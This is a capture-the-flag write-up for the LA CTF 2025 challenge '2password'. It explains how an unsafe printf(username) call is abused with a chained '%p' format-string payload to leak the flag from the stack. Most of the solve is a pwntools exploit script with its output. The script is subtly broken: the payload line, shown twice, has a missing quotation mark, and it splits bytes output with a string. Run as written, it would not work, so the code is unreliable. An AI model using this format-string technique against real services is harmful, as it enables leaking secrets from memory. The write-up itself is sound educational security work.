# [pwn/2password](https://github.com/uclaacm/lactf-archive/tree/main/2025/pwn/2password) - by kaiphait

Obtain the flag by interfacing with a simple C program that asks for a username and two passwords.
<details> 
  <summary>Summary of my solve:</summary>
  
   Abuse unsafe printf() call via format specifier attack.
  
  <a href="https://owasp.org/www-community/attacks/Format_string_attack">Vulnerability description on OWASP.org</a>
</details>

## The Challenge

Hint: 2Password > 1password

Provided files:
- [chall](https://github.com/uclaacm/lactf-archive/blob/main/2025/pwn/2password/chall) - executable with which we will interface
- [chall.c](https://github.com/uclaacm/lactf-archive/blob/main/2025/pwn/2password/chall.c) - source code for executable
- [libc.so.6](https://github.com/uclaacm/lactf-archive/blob/main/2025/pwn/2password/libc.so.6) - glibc library from server
- [ld-linux-x86-64.so.2](https://github.com/uclaacm/lactf-archive/blob/main/2025/pwn/2password/ld-linux-x86-64.so.2) - linux linker from server
- [Dockerfile](https://github.com/uclaacm/lactf-archive/blob/main/2025/pwn/2password/Dockerfile) - configuration file for Docker container in which the chall .executable is running on the server 

We are also given the address to a socket with which to interface with the server -- where the actual flag file is stored.

## Starting Point : Exploration
One of the first thing I did was create my own local "flag.txt" to use for local testing. I formatted it to match the format of the other flags I had found during the event, giving it the "lactf{" prefix, "}" suffix, and making sure it was exactly 36 characters long:
```bash
echo -n "lactf{this_is_a_fake_flag_for_local}" > flag.txt
```
Taking a look at [chall.c](https://github.com/uclaacm/lactf-archive/blob/main/2025/pwn/2password/chall.c):

The program reads a "username", a first password, "password1", and a second password, "password2":
```c
... // line 18 : chall.c
  printf("Enter username: ");
  char username[42];
  readline(username, sizeof username, stdin);
  printf("Enter password1: ");
  char password1[42];
  readline(password1, sizeof password1, stdin);
  printf("Enter password2: ");
  char password2[42];
  readline(password2, sizeof password2, stdin);
...
```
<br><br/>

Next, the program reads the flag we need from "flag.txt" -- notably, the flag is loaded before the username and passwords are checked:
```c
... // line 27 : chall.c
  FILE *flag_file = fopen("flag.txt", "r");
  if (!flag_file) {
    puts("can't open flag");
    exit(1);
  }
  char flag[42];
  readline(flag, sizeof flag, flag_file);
...
```
<br/><br/>

Finally, the program checks the username and passwords, and if correct, the flag is printed. Otherwise, an error message is given.
```c
... // line 34 : chall.c
  if (strcmp(username, "kaiphait") == 0 &&
      strcmp(password1, "correct horse battery staple") == 0 &&
      strcmp(password2, flag) == 0) {
    puts("Access granted");
  } else {
    printf("Incorrect password for user ");
    printf(username);
    printf("\n");
  }
}
```

Ah, so that's why flag.txt is loaded before the comparison -- the flag will only be printed if the value of "password2" equals... the flag!
We can also see the hard-coded values for username and password1 that must be entered for the flag to be printed. But maybe we don't need to actually enter the correct username and passwords at all.
<br/><br/>
## [The Solve : Format string attack](https://owasp.org/www-community/attacks/Format_string_attack)
An important observation for this challenge is that when the incorrect credentials are entered, the username the user enters is printed without any validation:

![Unsafe print](/media/2password_vuln.png)

In the above image, I input the format specifier "%p" for the username. %p is the "external representation of a pointer to void". You can read about this vulnerability on [OWASP's Format string attack](
https://owasp.org/www-community/attacks/Format_string_attack) page, which actualy describes the payload I will use to capture this flag in the "Different Payloads" section.
<br/><br/>
But first, to automate some of this attack and make it more easily repeatable, I created a python script that uses the ["pwntools" library](https://github.com/Gallopsled/pwntools). This CTF was my first time playing around with pwntools, and it really came in handy! I feel like I've barely scratched the surface of its capabilities, and I'm excited to keep using it and learn more of what it can do. 

So, the solve script. First, we just import the library and create an process object "p" which we can use to execute the local copy of the executable and interact with it:
```python
# Import the pwntools library 
from pwn import *

p = process("./chall") # local executable

```
<br/><br/>
Next, I create a payload chaining the format specifier "%p" together several times, separated by a hyphen for readability, to leak as much of the data on the stack that I can. I played around with the range, printing about 11 is the sweet spot -- too many, and the program will crash, too few, and the values we need will not be leaked. It seemed to vary slightly between local and remote. The "sendline" then sends the payload to the process as the value for "username".
```python
payload = "-".join("%p for _ in range(11)) # generate payload

p.sendline(payload)
```
<br/><br/>
Next, I enter dummy values for password1 and password2 and process the program's stdout until the program eventually tries to print the "username", but actually prints the next 10 values from the stack. We capture that output as "output" via the recvline() command. I have included an example print of the output below, though there is no need to print it in the final solve script since we capture it in "output".
```python
p.recvuntil(b"Enter password1: ")
p.sendline("no")
p.recvuntil(b"Enter password2: ")
p.sendline("u")

output = p.recvline()
```
Output:

![output](/media/2password_dump.png)
<br/><br/>

It took me a little bit of playing around with this output to find a way to get the flag, though I was overcomplicating it. I tried interpreting these printed values as pointers to other parts of the stack via the %s, but the answer was pretty simple -- in fact, the flag has already been printed! Looking at one of the values:
```
0x68747b667463616c
```
I noticed that the last octet, "6c" corresponds to the UTF-8 value for the character "l". Interpreting the rest of the string as UTF-8 gives the following result:
```bash
$ echo "0x68747b667463616c" | xxd -p -r                                                           
> ht{ftcal%
```
Well, reversed, that looks like the first 8 characters of the flag, "lactf{th"!

<br/><br/>

So, let's continue with the solve script. We'll split the output string on '-', trim the '0x' prefix, and interpret each value as little-endian and convert it to from hex to UTF-8

```python
arr = output.split('-')
for value in arr:
  result = value
  if result.startswith('0x'):  # Trim the prefix if this looks like a hex value
    result = value[2:]
  else:                        # if it is not a hex value, ignore it (things like (nil))
    continue
  if len(result) %2 != 0:      # ignore values that don't have an even number of characters
    continue

  byte_pairs = []
  for i in range(0, len(result), 2): # group each octet
    byte_pairs.append(result[i:i+2])

  byte_pairs.reverse()         # Reverse the octets for readability
  result = "".join(chr(int(pair, 16)) for pair in byte_pairs) # Convert each octet from a hex value to UTF-8

  print(result, end="") # print each result with no newline so that the flag is immediately readable
print() # print newline
p.close() # responsible file-openers be like 
```
When run on the local copy, I get:
```bash
lactf{this_is_a_fake_flag_for_local}\x00\x10
```
Great, that's the dummy flag! There's a little junk data, one of the values in "output" is likely a pointer to somewhere, you could definitely refine the output processing so that only the flag is printed, but I wasn't too worried about that in this setting.

<br/><br/>

Thanks to pwntools, running the solve script is as easy as changing the 'p' object to point at a remote destination:
```python
#p = process("./chall") # local executable
p = remote("chall.lac.tf", 31142) # point to server copy on appropriate port 
```
<br/><br/>

So the full solve script to solve on remote becomes:
```python
# Import the pwntools library 
from pwn import *

# Connect
p = remote("chall.lac.tf", 31142) # point to server copy on appropriate port 

# Generate payload
payload = "-".join("%p for _ in range(11)) # generate payload
p.sendline(payload)

p.recvuntil(b"Enter password1: ")
p.sendline("no")
p.recvuntil(b"Enter password2: ")
p.sendline("u")

# Capture output
output = p.recvline()

# Process output
arr = output.split('-')
for value in arr:
  result = value
  if result.startswith('0x'):  # Trim the prefix if this looks like a hex value
    result = value[2:]
  else:                        # if it is not a hex value, ignore it (things like (nil))
    continue
  if len(result) %2 != 0:      # ignore values that don't have an even number of characters
    continue

  byte_pairs = []
  for i in range(0, len(result), 2): # group each octet
    byte_pairs.append(result[i:i+2])

  byte_pairs.reverse()         # Reverse the octets for readability
  result = "".join(chr(int(pair, 16)) for pair in byte_pairs) # Convert each octet from a hex value to UTF-8

  print(result, end="") # print each result with no newline so that the flag is immediately readable
print() # print newline
p.close() # responsible file-openers be like 
```
Which gives the output:
```bash
$ python solve.py
> §ê¬Ylactf{hunter2_cfc0xz68}
```
Trimming the junk data, the flag is revealed to be ```lactf{hunter2_cfc0xz68}```


This was my 9th solve, roughly 52 minutes before the competition ended! [I wonder if I can solve one more...](writeups/Extremely-Convenient-Breaker)
















